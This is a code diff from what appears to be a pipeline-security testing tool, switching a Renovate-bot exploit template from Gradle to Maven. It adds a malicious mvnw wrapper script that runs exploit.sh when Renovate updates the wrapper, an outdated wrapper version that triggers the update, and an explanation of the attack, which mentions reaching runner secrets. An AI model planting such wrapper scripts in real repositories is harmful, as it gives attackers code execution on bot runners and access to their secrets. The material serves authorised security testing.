@@ -9,44 +9,49 @@ const RenovateJSON = `
     "$schema": "https://docs.renovatebot.com/renovate-schema.json",
     "extends": [
        "config:recommended"
-    ]
+    ],
+    "prConcurrentLimit": 0,
+    "prHourlyLimit": 0
 }
 `
 
-// BuildGradle is a minimal build.gradle file with an outdated dependency
-const BuildGradle = `
-plugins {
-    id 'java'
-}
+// PomXML is a minimal pom.xml file with an outdated dependency
+const PomXML = `
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+    <groupId>com.example</groupId>
+    <artifactId>pipeleek-autodiscovery-poc</artifactId>
+    <version>1.0-SNAPSHOT</version>
 
-repositories {
-    mavenCentral()
-}
-
-dependencies {
-    implementation 'com.google.guava:guava:31.0-jre'
-}
+    <dependencies>
+        <dependency>
+            <groupId>junit</groupId>
+            <artifactId>junit</artifactId>
+            <version>4.12</version>
+            <scope>test</scope>
+        </dependency>
+    </dependencies>
+</project>
 `
 
-// GradlewScript is a malicious Gradle wrapper script that executes during Renovate's artifact update phase
-const GradlewScript = `#!/bin/sh
-# Malicious Gradle wrapper script that executes during Renovate's artifact update phase
-# This runs when Renovate detects a Gradle wrapper update
+// MvnwScript is a malicious Maven wrapper script that executes during Renovate's artifact update phase
+const MvnwScript = `#!/bin/sh
+# Malicious Maven wrapper script that executes during Renovate's artifact update phase
+# This runs when Renovate detects a Maven wrapper update
 
 # Execute exploit
 sh exploit.sh
 
-# Continue with a fake gradle command to avoid errors
-echo "Gradle wrapper executed"
+# Continue with a fake maven command to avoid errors
+echo "Maven wrapper executed"
 exit 0
 `
 
-// GradleWrapperProperties specifies an outdated Gradle version that triggers updates
-const GradleWrapperProperties = `distributionBase=GRADLE_USER_HOME
-distributionPath=wrapper/dists
-distributionUrl=https\://services.gradle.org/distributions/gradle-7.0-bin.zip
-zipStoreBase=GRADLE_USER_HOME
-zipStorePath=wrapper/dists
+// MavenWrapperProperties specifies an outdated Maven wrapper version that triggers updates
+const MavenWrapperProperties = `distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/3.8.1/apache-maven-3.8.1-bin.zip
+wrapperUrl=https://repo.maven.apache.org/maven2/org/apache/maven/wrapper/maven-wrapper/3.1.0/maven-wrapper-3.1.0.jar
 `
 
 // ExploitScript is a proof-of-concept script that demonstrates code execution
@@ -72,7 +77,7 @@ echo "  - Access secrets from the runner"
 `
 
 // ExploitExplanation provides information about how the exploit works
-const ExploitExplanation = `This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'
-When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh
+const ExploitExplanation = `This exploit works by using an outdated Maven wrapper version that triggers Renovate to run './mvnw wrapper:wrapper'
+When Renovate updates the wrapper, it executes our malicious mvnw script which runs exploit.sh
 Make sure to update the exploit.sh script with the actual exploit code
 Then wait until the created repository/project is renovated by the invited Renovate Bot user`
